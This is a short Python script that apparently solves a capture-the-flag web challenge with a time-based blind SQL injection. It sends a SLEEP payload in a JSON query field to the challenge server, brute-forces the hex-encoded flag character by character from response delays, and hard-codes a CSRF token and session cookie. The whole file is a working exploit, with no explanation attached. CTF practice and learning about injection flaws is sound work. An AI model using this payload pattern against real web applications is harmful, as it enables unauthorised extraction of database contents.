import requests
from time import time


dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        
        question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        start = time()

        response = requests.post('http://web-17.challs.olicyber.it/api/time', 
                                 headers={"X-CSRFToken":'IjM4YmQ3MWU5MWU0MzY5MTBiNTExOGYzZGFhYTk4M2Y3NWY4YTYxOTAi.Z_D_1Q.ztEplKPp97S3mLQttglDPiWdAhQ'}, 
                                 json={'query': question}, 
                                 cookies={'session':'eyJjc3JmX3Rva2VuIjoiMzhiZDcxZTkxZTQzNjkxMGI1MTE4ZjNkYWFhOTgzZjc1ZjhhNjE5MCJ9.Z-_ujA.pARM2ZGszwn2T_ke_UAtPY5MGVo'}
                                )
        #print(response.text)

        elapsed = time() - start

        if response.status_code == 200:
            data = response.json()
            #print("Response JSON:", data)
            if elapsed > 1:  
                result += c
                print(f"[+] Current result: {result}")
                break
    else:
        break

secret = bytes.fromhex(result).decode()
print(f"flag: {secret}")
